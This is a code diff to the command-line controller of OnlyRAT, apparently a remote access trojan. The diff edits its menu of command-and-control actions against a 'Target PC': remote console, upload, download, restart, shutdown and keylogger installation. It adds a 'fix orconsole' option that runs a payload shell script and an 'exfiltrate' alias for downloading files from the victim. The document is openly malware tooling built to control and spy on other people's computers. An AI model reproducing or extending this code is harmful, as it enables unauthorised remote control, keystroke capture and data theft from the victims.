@@ -39,11 +39,12 @@ help_menu = """
 # option menu
 options_menu = """
         [+] Command and Control:
-            [orconsole] -- Remote Console
-            [upload] ----- Upload File 
-            [downlaod] --- Download File
-            [restart] ---- Restart Target PC
-            [shutdown] --- Shutdown Target PC
+            [orconsole] ------ Remote Console
+            [fix orconsole] -- Fix Remote Console
+            [upload] --------- Upload File 
+            [downlaod] ------- Download File
+            [restart] -------- Restart Target PC
+            [shutdown] ------- Shutdown Target PC
 
         [+] Reconnaissance:
             [install keylogger] ------ Install Keylogger
@@ -55,7 +56,7 @@ options_menu = """
 
         [+] Options:
             [help] ----- Help Menu
-            [module] --- Help Menu For Modules
+            [man] ------ Onlyrat Manual
             [config] --- Display RAT File
             [version] -- Version Number
             [update] --- Update OnlyRAT
@@ -339,6 +340,10 @@ def cli(arguments):
             if option == "orconsole":
                 connect(ipv4, password)
 
+            # fix remote console
+            if option == "fix orconsole":
+                os.system(f"sh {local_path}/payloads/fix-orconsole.sh {local_path} {ipv4} {password}")
+
             # keylogger option
             elif option == "install keylogger":
                 keylogger(ipv4, password, target_username, working_direcory)
@@ -372,7 +377,7 @@ def cli(arguments):
                 upload(ipv4, password, working_direcory)
 
             # custom download
-            elif option == "download":
+            elif option == "download" or option == "exfiltrate":
                 download(ipv4, password)
 
             # restart target option
@@ -419,9 +424,9 @@ def cli(arguments):
                 update()
                 exit()
 
-            # help menu for modules
-            elif option == "module":
-                os.system(f"xdg-open ")
+            # onlyrat manual
+            elif option == "man" or option == "manual":
+                os.system(f"xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
 
             # remove installation
             elif option == "remove" or option == "uninstall":
